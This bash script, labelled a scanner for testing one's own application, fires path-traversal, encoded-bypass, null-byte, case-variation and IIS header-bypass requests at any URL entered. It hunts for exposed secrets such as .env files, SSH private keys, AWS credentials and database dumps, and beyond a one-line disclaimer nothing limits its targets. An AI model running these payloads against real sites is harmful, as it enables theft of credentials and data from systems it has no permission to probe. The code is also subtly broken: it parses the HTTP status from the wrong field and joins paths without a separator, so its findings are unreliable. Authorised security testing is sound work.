#!/bin/bash
# Advanced Security Testing Scanner (Own Application Only)
# Tests for sensitive file disclosure, path traversal, and configuration exposure

set -o pipefail

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Interactive input
clear
echo -e "${BLUE}=========================================${NC}"
echo -e "${BLUE}  Advanced Security Testing Scanner${NC}"
echo -e "${BLUE}=========================================${NC}"
echo
echo -e "${YELLOW}[*] This tool is for testing YOUR OWN applications only.${NC}"
echo -e "${YELLOW}[*] Unauthorized testing is illegal.${NC}"
echo
read -p "Enter target domain/URL (e.g., https://localhost:8000 or https://myapp.local): " BASE_URL

# Validate URL input
if [ -z "$BASE_URL" ]; then
    echo -e "${RED}[!] Error: Domain cannot be empty${NC}"
    exit 1
fi

# Remove trailing slash if present
BASE_URL="${BASE_URL%/}"

# Add https:// if protocol is missing
if [[ ! "$BASE_URL" =~ ^https?:// ]]; then
    BASE_URL="https://${BASE_URL}"
fi

# Validate URL format
if [[ ! "$BASE_URL" =~ ^https?:// ]]; then
    echo -e "${RED}[!] Error: Invalid URL format${NC}"
    exit 1
fi

read -p "Enter output filename (default: security_test_results.txt): " OUTPUT_FILE
OUTPUT_FILE="${OUTPUT_FILE:-security_test_results.txt}"

# Confirmation
echo
echo -e "${YELLOW}Target URL: $BASE_URL${NC}"
echo -e "${YELLOW}Output File: $OUTPUT_FILE${NC}"
read -p "Continue with scan? (yes/no): " CONFIRM

if [[ ! "$CONFIRM" =~ ^[Yy][Ee][Ss]$ ]]; then
    echo -e "${RED}[!] Scan cancelled${NC}"
    exit 0
fi

echo
echo -e "${GREEN}[+] Starting scan...${NC}"
echo
TIMEOUT=10
VERBOSE=false

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Initialize results
declare -a FINDINGS
TOTAL_TESTS=0
VULNERABILITIES_FOUND=0

log_result() {
    local status="$1"
    local message="$2"
    local details="$3"
    
    echo -e "${status}${message}${NC}"
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $message | $details" >> "$OUTPUT_FILE"
    
    if [[ "$status" == *"31m"* ]]; then
        ((VULNERABILITIES_FOUND++))
    fi
}

test_url() {
    local url="$1"
    local description="$2"
    
    ((TOTAL_TESTS++))
    
    local response=$(curl -sk --connect-timeout $TIMEOUT -m $TIMEOUT \
        -w "\n%{http_code}|%{size_download}|%{time_total}" \
        "$url" 2>/dev/null)
    
    local status=$(echo "$response" | tail -1 | cut -d'|' -f2)
    local size=$(echo "$response" | tail -1 | cut -d'|' -f2)
    local body=$(echo "$response" | sed '$d')
    
    if [[ "$status" == "200" || "$status" == "206" ]]; then
        if [ ${#body} -gt 50 ]; then
            log_result "$RED[VULN]$NC" "$description" "HTTP $status | Size: $size bytes | URL: $url"
            return 0
        fi
    elif [[ "$status" == "403" ]]; then
        [ "$VERBOSE" = true ] && echo -e "${YELLOW}[AUTH]${NC} Access denied (403): $url"
    fi
    
    return 1
}

echo "========================================="
echo "  Security Testing Scanner"
echo "========================================="
echo "Target: $BASE_URL"
echo "Started: $(date)"
echo "=========================================" | tee "$OUTPUT_FILE"
echo

# Sensitive files to test
SENSITIVE_FILES=(
    ".env"
    ".env.local"
    ".env.production"
    ".git/config"
    ".git/HEAD"
    ".gitconfig"
    ".svn/entries"
    ".hg/store/fncache"
    ".htpasswd"
    ".htaccess"
    ".htgroups"
    ".mysql_history"
    ".bash_history"
    ".ssh/id_rsa"
    ".ssh/id_dsa"
    ".ssh/authorized_keys"
    "config.php"
    "config.py"
    "settings.py"
    "wp-config.php"
    "composer.json"
    "composer.lock"
    "package.json"
    "package-lock.json"
    "yarn.lock"
    "requirements.txt"
    "Gemfile.lock"
    "backup.sql"
    "db.sql"
    "dump.sql"
    "database.yml"
    "credentials.yml"
    "secrets.yml"
    ".aws/credentials"
    ".env.example"
    "api_keys.json"
    "config.json"
)

# Path traversal patterns
TRAVERSAL_PATTERNS=(
    "%s"
    "../%s"
    "../../%s"
    "../../../%s"
    "../../../../%s"
    "../../../../../%s"
    "%2e%2e/%s"
    "%2e%2e/%2e%2e/%s"
    "%252e%252e/%s"
    "..%252f%s"
    "....//....//..../%s"
    "....%2f....%2f....%2f%s"
    "%c0%ae%c0%ae/%s"
)

# Parameter names to test
PARAMS=(
    "file" "page" "include" "load" "view" "next" "redirect"
    "path" "filepath" "filename" "url" "src" "template"
    "data" "content" "page_name" "page_id" "action"
)

# HTTP methods to test
METHODS=("GET" "POST" "PUT")

echo -e "${YELLOW}[*] Testing Direct Access${NC}"
for file in "${SENSITIVE_FILES[@]}"; do
    for pattern in "${TRAVERSAL_PATTERNS[@]}"; do
        # Use sed to avoid printf format string issues
        path=$(echo "$pattern" | sed "s|%s|$file|g")
        url="${BASE_URL}${path}"
        test_url "$url" "Direct: $file" > /dev/null 2>&1
    done
done

echo -e "${YELLOW}[*] Testing Parameter-Based Inclusion${NC}"
for param in "${PARAMS[@]}"; do
    for file in "${SENSITIVE_FILES[@]}"; do
        for pattern in "${TRAVERSAL_PATTERNS[@]}"; do
            path=$(echo "$pattern" | sed "s|%s|$file|g")
            url="${BASE_URL}?${param}=${path}"
            test_url "$url" "Param: $param=$file" > /dev/null 2>&1
        done
    done
done

echo -e "${YELLOW}[*] Testing NULL Byte Injection${NC}"
for file in "${SENSITIVE_FILES[@]}"; do
    url="${BASE_URL}${file}%00.php"
    test_url "$url" "NULL byte: $file" > /dev/null 2>&1
done

echo -e "${YELLOW}[*] Testing Unicode Encoding${NC}"
for file in "${SENSITIVE_FILES[@]}"; do
    url="${BASE_URL}%ef%bc%8e%ef%bc%8e%2f${file}"
    test_url "$url" "Unicode bypass: $file" > /dev/null 2>&1
done

echo -e "${YELLOW}[*] Testing Archive/Backup Extensions${NC}"
BACKUP_EXTS=(".bak" ".backup" ".old" ".orig" ".zip" ".tar" ".gz" ".7z")
for ext in "${BACKUP_EXTS[@]}"; do
    for file in "config" "database" "app" "index"; do
        url="${BASE_URL}${file}${ext}"
        test_url "$url" "Backup: $file$ext" > /dev/null 2>&1
    done
done

echo -e "${YELLOW}[*] Testing Case Variation Bypass${NC}"
for file in "${SENSITIVE_FILES[@]}"; do
    url_upper="${BASE_URL}$(echo "$file" | tr '[:lower:]' '[:upper:]')"
    url_lower="${BASE_URL}$(echo "$file" | tr '[:upper:]' '[:lower:]')"
    test_url "$url_upper" "Case bypass (upper): $file" > /dev/null 2>&1
    test_url "$url_lower" "Case bypass (lower): $file" > /dev/null 2>&1
done

echo -e "${YELLOW}[*] Testing Header-Based Exploits${NC}"
for file in "${SENSITIVE_FILES[@]}"; do
    # X-Original-URL header (IIS bypass)
    curl -sk --connect-timeout $TIMEOUT -m $TIMEOUT \
        -H "X-Original-URL: /${file}" \
        "${BASE_URL}index.html" > /dev/null 2>&1
    
    # X-Rewrite-URL header (IIS bypass)
    curl -sk --connect-timeout $TIMEOUT -m $TIMEOUT \
        -H "X-Rewrite-URL: /${file}" \
        "${BASE_URL}index.html" > /dev/null 2>&1
done

echo
echo "========================================="
echo -e "${GREEN}Scan Complete!${NC}"
echo "========================================="
echo "Total Tests: $TOTAL_TESTS"
echo -e "Vulnerabilities Found: ${RED}$VULNERABILITIES_FOUND${NC}"
echo "Results saved to: $OUTPUT_FILE"
echo "Completed: $(date)"
echo "=========================================
